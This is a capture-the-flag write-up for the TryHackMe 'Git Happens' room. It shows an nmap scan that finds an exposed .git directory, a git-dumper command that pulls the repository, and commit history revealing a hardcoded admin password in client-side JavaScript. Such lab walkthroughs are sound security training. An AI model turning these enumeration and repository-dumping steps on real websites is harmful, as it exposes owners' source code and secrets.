# Git Happens

Boss wanted me to create a prototype, so here it is! We even used something called "version control" that made deploying this really easy!

[Git Happens](https://tryhackme.com/room/githappens)

## Topic's

* Network Enumeration
* Enumeration Git

## Task 1 Capture the Flag

Can you find the password to the application?

```
kali@kali:~/CTFs/tryhackme/Git Happens$ sudo nmap -A -sS -sC -sV -O 10.10.182.85
[sudo] password for kali: 
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 13:56 CEST
Nmap scan report for 10.10.182.85
Host is up (0.037s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-git: 
|   10.10.182.85:80/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Super Awesome Site!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/14%OT=80%CT=1%CU=40502%PV=Y%DS=2%DC=T%G=Y%TM=5F86E7
OS:88%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 143/tcp)
HOP RTT      ADDRESS
1   36.10 ms 10.8.0.1
2   37.06 ms 10.10.182.85

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.65 seconds
```

```
/opt/git-dumper/git-dumper.py http://10.10.182.85:80/.git/ "/home/kali/CTFs/tryhackme/Git Happens/git_files"

kali@kali:~/CTFs/tryhackme/Git Happens$ cd git_files/
kali@kali:~/CTFs/tryhackme/Git Happens/git_files$ git log 
commit d0b3578a628889f38c0affb1b75457146a4678e5 (HEAD -> master, tag: v1.0)
Author: Adam Bertrand <hydragyrum@gmail.com>
Date:   Thu Jul 23 22:22:16 2020 +0000

    Update .gitlab-ci.yml

commit 77aab78e2624ec9400f9ed3f43a6f0c942eeb82d
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Fri Jul 24 00:21:25 2020 +0200

    add gitlab-ci config to build docker file.

commit 2eb93ac3534155069a8ef59cb25b9c1971d5d199
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Fri Jul 24 00:08:38 2020 +0200
```

```
kali@kali:~/CTFs/tryhackme/Git Happens/git_files$ git show 395e087334d613d5e423cdf8f7be27196a360459
commit 395e087334d613d5e423cdf8f7be27196a360459
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Thu Jul 23 23:17:43 2020 +0200

    Made the login page, boss!

diff --git a/index.html b/index.html
new file mode 100644
index 0000000..0e0de07
--- /dev/null
+++ b/index.html
@@ -0,0 +1,75 @@
+    <script>
+      function login() {
+        let form = document.getElementById("login-form");
+        console.log(form.elements);
+        let username = form.elements["username"].value;
+        let password = form.elements["password"].value;
+        if (
+          username === "admin" &&
+          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
+        ) {
+          document.cookie = "login=1";
+          window.location.href = "/dashboard.html";
+        } else {
+          document.getElementById("error").innerHTML =
+            "INVALID USERNAME OR PASSWORD!";
+        }
+      }
+    </script>
+  </body>
+</html>
```

`admin:Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!`

1. Find the Super Secret Password

`Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!`
